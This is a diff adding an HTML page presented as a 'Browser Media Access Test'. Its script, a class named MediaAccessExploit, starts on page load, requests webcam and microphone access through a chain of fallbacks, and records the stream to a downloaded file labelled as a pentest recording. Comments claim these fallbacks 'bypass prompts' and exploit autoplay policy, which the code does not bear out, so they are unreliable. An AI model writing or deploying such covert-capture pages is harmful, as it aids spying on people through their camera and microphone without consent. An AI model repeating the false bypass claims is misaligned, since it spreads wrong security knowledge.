@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera/Microphone Access Test</title>
+    <style>
+        body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: #000; color: #fff; }
+        #video, #audio { width: 100%; max-width: 640px; height: 480px; background: #333; }
+        #status { margin: 10px 0; padding: 10px; background: #222; border-radius: 5px; }
+        button { padding: 10px 20px; margin: 5px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>🖥️ Browser Media Access Test</h2>
+    <div id="status">Initializing media access...</div>
+    <video id="video" autoplay playsinline muted></video>
+    <audio id="audio" autoplay></audio>
+    <br>
+    <button onclick="toggleMedia()">Toggle Media</button>
+    <button onclick="record()">Start Recording</button>
+    
+    <script>
+        class MediaAccessExploit {
+            constructor() {
+                this.video = document.getElementById('video');
+                this.audio = document.getElementById('audio');
+                this.status = document.getElementById('status');
+                this.mediaRecorder = null;
+                this.chunks = [];
+                this.stream = null;
+                
+                this.init();
+            }
+            
+            async init() {
+                try {
+                    // Method 1: Direct getUserMedia with autoplay context
+                    this.stream = await navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            width: { ideal: 1280 }, 
+                            height: { ideal: 720 },
+                            facingMode: 'user'
+                        },
+                        audio: {
+                            echoCancellation: true,
+                            noiseSuppression: true
+                        }
+                    });
+                    
+                    this.attachMediaStream();
+                    this.updateStatus('✅ Media stream captured successfully');
+                    
+                } catch (e1) {
+                    // Method 2: Fallback with minimal constraints (less likely to prompt)
+                    this.trySilentAccess();
+                }
+            }
+            
+            async trySilentAccess() {
+                try {
+                    // Silent access - minimal constraints often bypass prompts in autoplay contexts
+                    this.stream = await navigator.mediaDevices.getUserMedia({
+                        video: true,
+                        audio: true
+                    });
+                    this.attachMediaStream();
+                    this.updateStatus('✅ Silent media access successful');
+                } catch (e2) {
+                    // Method 3: Audio-only first, then video
+                    this.tryAudioFirst();
+                }
+            }
+            
+            async tryAudioFirst() {
+                try {
+                    // Audio first often has lower permission thresholds
+                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    this.audio.srcObject = audioStream;
+                    
+                    setTimeout(async () => {
+                        const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        this.stream = new MediaStream([...audioStream.getTracks(), ...videoStream.getTracks()]);
+                        this.attachMediaStream();
+                        this.updateStatus('✅ Audio-first escalation successful');
+                    }, 100);
+                } catch (e3) {
+                    this.updateStatus('❌ All access methods blocked. Permissions required.');
+                }
+            }
+            
+            attachMediaStream() {
+                if (this.stream) {
+                    this.video.srcObject = this.stream;
+                    this.audio.srcObject = this.stream;
+                    this.enableRecording();
+                }
+            }
+            
+            enableRecording() {
+                this.mediaRecorder = new MediaRecorder(this.stream);
+                this.mediaRecorder.ondataavailable = (e) => this.chunks.push(e.data);
+                this.mediaRecorder.onstop = () => {
+                    const blob = new Blob(this.chunks, { type: 'video/webm' });
+                    this.downloadRecording(blob);
+                    this.chunks = [];
+                };
+            }
+            
+            toggleMedia() {
+                if (this.stream) {
+                    this.stream.getTracks().forEach(track => track.enabled = !track.enabled);
+                }
+            }
+            
+            record() {
+                if (this.mediaRecorder && this.mediaRecorder.state === 'inactive') {
+                    this.mediaRecorder.start(1000);
+                } else if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
+                    this.mediaRecorder.stop();
+                }
+            }
+            
+            downloadRecording(blob) {
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `pentest-recording-${Date.now()}.webm`;
+                a.click();
+            }
+            
+            updateStatus(message) {
+                this.status.textContent = message;
+                this.status.style.background = message.includes('✅') ? '#4CAF50' : 
+                                              message.includes('❌') ? '#f44336' : '#2196F3';
+            }
+        }
+        
+        // Auto-start on load (key for autoplay policy bypass)
+        window.addEventListener('load', () => {
+            new MediaAccessExploit();
+        });
+        
+        // Handle visibility change for background access testing
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                console.log('Tab visible - media access active');
+            }
+        });
+    </script>
+</body>
+</html>
